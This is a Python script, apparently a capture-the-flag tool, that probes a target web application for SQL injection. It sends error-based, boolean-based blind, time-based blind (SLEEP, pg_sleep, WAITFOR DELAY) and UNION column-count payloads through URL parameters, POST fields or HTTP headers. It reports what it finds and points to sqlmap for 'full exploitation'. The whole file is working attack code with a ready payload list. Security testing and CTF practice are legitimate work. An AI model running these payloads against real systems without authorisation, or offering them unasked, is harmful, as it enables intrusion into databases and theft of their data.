#!/usr/bin/env python3
"""
sqli_probe.py - CTF SQL Injection Probe

Sends common syntax-breaking characters and time-based payloads
to identify SQLi entry points. Supports:
- Error-based detection (MySQL, PostgreSQL, SQLite, Oracle, MSSQL)
- Time-based blind detection
- UNION-based column count detection
- POST method support
- Header injection (User-Agent, Referer, Cookie)
- Boolean-based blind detection
"""

import argparse
import sys
import re
import time
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ANSI colors
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

# Error signatures per database
SQL_ERRORS = {
    'MySQL': [
        'SQL syntax', 'mysql_query', 'Warning: mysqli', 'MySQL Error',
        'You have an error in your SQL syntax', 'mysql_fetch', 'SQLSTATE',
        'supplied argument is not a valid MySQL',
    ],
    'PostgreSQL': [
        'PostgreSQL query failed', 'Syntax error at or near',
        'pg_query', 'pg_exec', 'ERROR:  syntax error',
    ],
    'SQLite': [
        'SQLite3::query', 'unrecognized token', 'near "',
        'SQLITE_ERROR', 'sqlite3.OperationalError',
    ],
    'Oracle': [
        'ORA-', 'Oracle error', 'PLS-', 'quoted string not properly terminated'
    ],
    'MSSQL': [
        'Unclosed quotation mark', 'SQL Server Driver',
        'OLE DB Provider for SQL Server', 'mssql_query',
        'Microsoft OLE DB Provider', '[Microsoft][ODBC',
    ]
}

# ─── Payload Sets ─────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'", '"', "\\", "')", '")', "'))", '"))',
    "`", "' OR 1=1--", "' OR '1'='1",
    "1' AND '1'='1", '1" AND "1"="1',
    "' UNION SELECT NULL--", "')) OR 1=1--",
    "';", '";', "' AND 1=CONVERT(int,@@version)--",
    "1 OR 1=1", "1' OR ''='",
]

TIME_DELAY = 5
TIME_PAYLOADS = [
    f"' OR SLEEP({TIME_DELAY})-- -",
    f"' OR SLEEP({TIME_DELAY})#",
    f"1' AND SLEEP({TIME_DELAY})-- -",
    f"' OR pg_sleep({TIME_DELAY})--",
    f"1; WAITFOR DELAY '0:0:{TIME_DELAY}'--",
    f"'; WAITFOR DELAY '0:0:{TIME_DELAY}'--",
    f"' AND (SELECT * FROM (SELECT SLEEP({TIME_DELAY}))a)-- -",
]

BOOLEAN_TRUE = ["' OR 1=1-- -", "' OR '1'='1'-- -", "1 OR 1=1"]
BOOLEAN_FALSE = ["' OR 1=2-- -", "' OR '1'='2'-- -", "1 OR 1=2"]


def send_request(url, param, payload, method, session, cookies=None, headers=None,
                 post_data=None, inject_header=None):
    """Send a request with the payload injected."""
    req_headers = headers.copy() if headers else {}
    req_headers.setdefault('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0')
    
    # Header injection
    if inject_header:
        if inject_header == 'user-agent':
            req_headers['User-Agent'] = payload
        elif inject_header == 'referer':
            req_headers['Referer'] = payload
        elif inject_header == 'cookie':
            req_headers['Cookie'] = payload
        elif inject_header == 'x-forwarded-for':
            req_headers['X-Forwarded-For'] = payload
    
    if method == 'GET' and not inject_header:
        if 'INJECT' in url:
            test_url = url.replace('INJECT', urllib.parse.quote(payload, safe=''))
        else:
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            query[param] = [payload]
            new_query = urllib.parse.urlencode(query, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        
        start = time.time()
        res = session.get(test_url, cookies=cookies, headers=req_headers, verify=False, timeout=TIME_DELAY + 5)
        elapsed = time.time() - start
        return res, elapsed, test_url
    
    elif method == 'POST' or inject_header:
        pd = post_data.copy() if post_data else {}
        if param and not inject_header:
            pd[param] = payload
        test_url = url.replace('INJECT', '') if 'INJECT' in url else url
        
        start = time.time()
        res = session.post(test_url, data=pd, cookies=cookies, headers=req_headers, verify=False, timeout=TIME_DELAY + 5)
        elapsed = time.time() - start
        return res, elapsed, test_url
    
    return None, 0, None


def detect_errors(text):
    """Check response text for SQL error messages."""
    for db_type, errors in SQL_ERRORS.items():
        for error in errors:
            if error.lower() in text.lower():
                return db_type, error
    return None, None


def main():
    parser = argparse.ArgumentParser(
        description='CTF SQL Injection Probe',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 'http://target.com/item.php?id=INJECT'
  %(prog)s 'http://target.com/search' -p query
  %(prog)s 'http://target.com/login' -p user --method POST --post-data 'pass=test'
  %(prog)s 'http://target.com/' --inject-header user-agent
  %(prog)s 'http://target.com/?id=INJECT' --union
""")
    
    parser.add_argument('url', help="Target URL. Put 'INJECT' where payload goes, or use --param")
    parser.add_argument('-p', '--param', help='Parameter to inject')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method')
    parser.add_argument('--post-data', help='POST data (key=val&key2=val2)')
    parser.add_argument('-c', '--cookie', help='Cookies')
    parser.add_argument('--inject-header', choices=['user-agent', 'referer', 'cookie', 'x-forwarded-for'],
                        help='Inject payloads into HTTP headers instead of URL params')
    parser.add_argument('--union', action='store_true', help='Attempt UNION-based column detection')
    parser.add_argument('--boolean', action='store_true', help='Attempt boolean-based blind detection')
    parser.add_argument('--skip-time', action='store_true', help='Skip time-based tests (faster)')

    args = parser.parse_args()
    
    if 'INJECT' not in args.url and not args.param and not args.inject_header:
        print(f"{C.RED}Error: Must specify 'INJECT' in URL, --param, or --inject-header.{C.RESET}")
        sys.exit(1)

    print(f"\n{C.CYAN}{C.BOLD}{'─' * 60}\n  SQLi Probe\n{'─' * 60}{C.RESET}")
    print(f"  Target:  {args.url}")
    print(f"  Method:  {args.method}")
    if args.inject_header:
        print(f"  Inject:  Header ({args.inject_header})")

    cookies = {}
    if args.cookie:
        for c in args.cookie.split(';'):
            if '=' in c:
                k, v = c.strip().split('=', 1)
                cookies[k] = v

    post_data = {}
    if args.post_data:
        for pair in args.post_data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                post_data[k] = v

    session = requests.Session()
    
    # ── Baseline ──
    print(f"\n  {C.DIM}Establishing baseline...{C.RESET}")
    try:
        baseline_payload = '1'
        res, baseline_time, _ = send_request(args.url, args.param, baseline_payload,
                                             args.method, session, cookies, None,
                                             post_data, args.inject_header)
        baseline_len = len(res.text)
        print(f"  {C.DIM}Baseline: {baseline_time:.3f}s, {baseline_len} chars{C.RESET}\n")
    except Exception as e:
        print(f"  {C.RED}Failed to reach host: {e}{C.RESET}")
        sys.exit(1)

    found_any = False

    # ── 1. Error-Based ──
    print(f"  {C.YELLOW}⟳ Testing Error-Based payloads ({len(ERROR_PAYLOADS)})...{C.RESET}")
    for payload in ERROR_PAYLOADS:
        try:
            res, elapsed, hit_url = send_request(args.url, args.param, payload,
                                                 args.method, session, cookies, None,
                                                 post_data, args.inject_header)
            db_type, error_str = detect_errors(res.text)
            if db_type:
                found_any = True
                print(f"\n  {C.GREEN}{C.BOLD}★ ERROR-BASED SQLi FOUND! ★{C.RESET}")
                print(f"  {C.CYAN}Database:{C.RESET}  {db_type}")
                print(f"  {C.MAGENTA}Payload:{C.RESET}   {payload}")
                print(f"  {C.DIM}Error:{C.RESET}     {error_str}")
                print(f"  {C.DIM}URL:{C.RESET}       {hit_url}\n")
                break
        except:
            pass
    
    if not found_any:
        print(f"  {C.DIM}No error-based SQLi detected.{C.RESET}")

    # ── 2. Boolean-Based ──
    if args.boolean or not found_any:
        print(f"\n  {C.YELLOW}⟳ Testing Boolean-Based Blind...{C.RESET}")
        try:
            true_lens = []
            false_lens = []
            for bp in BOOLEAN_TRUE:
                res, _, _ = send_request(args.url, args.param, bp, args.method, session, cookies, None, post_data, args.inject_header)
                true_lens.append(len(res.text))
            for bp in BOOLEAN_FALSE:
                res, _, _ = send_request(args.url, args.param, bp, args.method, session, cookies, None, post_data, args.inject_header)
                false_lens.append(len(res.text))
            
            avg_true = sum(true_lens) / len(true_lens)
            avg_false = sum(false_lens) / len(false_lens)
            
            if abs(avg_true - avg_false) > max(50, baseline_len * 0.1):
                found_any = True
                print(f"\n  {C.GREEN}{C.BOLD}★ BOOLEAN-BASED BLIND SQLi LIKELY! ★{C.RESET}")
                print(f"  {C.DIM}True avg response:  {avg_true:.0f} chars{C.RESET}")
                print(f"  {C.DIM}False avg response: {avg_false:.0f} chars{C.RESET}")
                print(f"  {C.DIM}Difference: {abs(avg_true - avg_false):.0f} chars{C.RESET}\n")
            else:
                print(f"  {C.DIM}No boolean-based difference detected.{C.RESET}")
        except Exception as e:
            print(f"  {C.DIM}Boolean test failed: {e}{C.RESET}")

    # ── 3. Time-Based ──
    if not args.skip_time:
        print(f"\n  {C.YELLOW}⟳ Testing Time-Based Blind ({len(TIME_PAYLOADS)} payloads, this may take a moment)...{C.RESET}")
        for payload in TIME_PAYLOADS:
            try:
                res, elapsed, hit_url = send_request(args.url, args.param, payload,
                                                     args.method, session, cookies, None,
                                                     post_data, args.inject_header)
                if elapsed >= TIME_DELAY - 1 and baseline_time < 2:
                    found_any = True
                    print(f"\n  {C.GREEN}{C.BOLD}★ TIME-BASED BLIND SQLi FOUND! ★{C.RESET}")
                    print(f"  {C.MAGENTA}Payload:{C.RESET}  {payload}")
                    print(f"  {C.DIM}Response took {elapsed:.2f}s (baseline: {baseline_time:.3f}s){C.RESET}")
                    print(f"  {C.DIM}URL:{C.RESET}      {hit_url}\n")
                    break
            except requests.Timeout:
                if baseline_time < 2:
                    found_any = True
                    print(f"\n  {C.GREEN}{C.BOLD}★ TIME-BASED BLIND SQLi FOUND! ★{C.RESET}")
                    print(f"  {C.MAGENTA}Payload:{C.RESET}  {payload}")
                    print(f"  {C.DIM}Request timed out (likely sleeping){C.RESET}\n")
                    break
            except:
                pass
        if not found_any:
            print(f"  {C.DIM}No time-based SQLi detected.{C.RESET}")

    # ── 4. UNION-Based Column Count ──
    if args.union:
        print(f"\n  {C.YELLOW}⟳ Detecting UNION column count...{C.RESET}")
        for num_cols in range(1, 30):
            nulls = ','.join(['NULL'] * num_cols)
            payload = f"' UNION SELECT {nulls}-- -"
            try:
                res, _, hit_url = send_request(args.url, args.param, payload,
                                               args.method, session, cookies, None,
                                               post_data, args.inject_header)
                db_type, _ = detect_errors(res.text)
                # If no error, the UNION worked
                text_lower = res.text.lower()
                if not db_type and 'error' not in text_lower and len(res.text) != baseline_len:
                    found_any = True
                    print(f"\n  {C.GREEN}{C.BOLD}★ UNION-BASED SQLi: {num_cols} COLUMNS! ★{C.RESET}")
                    print(f"  {C.MAGENTA}Payload:{C.RESET} {payload}")
                    print(f"  {C.YELLOW}Next step: Replace NULLs with data extraction queries.{C.RESET}\n")
                    break
            except:
                pass
        else:
            print(f"  {C.DIM}Could not determine column count (1-29 tested).{C.RESET}")

    # ── Summary ──
    if found_any:
        print(f"  {C.YELLOW}Tip: Use sqlmap for full exploitation:{C.RESET}")
        cmd = f"sqlmap -u '{args.url}'"
        if args.param:
            cmd += f" -p {args.param}"
        if args.method == 'POST':
            cmd += f" --method POST --data '{args.post_data or ''}'"
        print(f"  {C.DIM}{cmd}{C.RESET}\n")
    else:
        print(f"\n  {C.RED}✗ No SQLi detected with tested payloads.{C.RESET}\n")


if __name__ == '__main__':
    main()
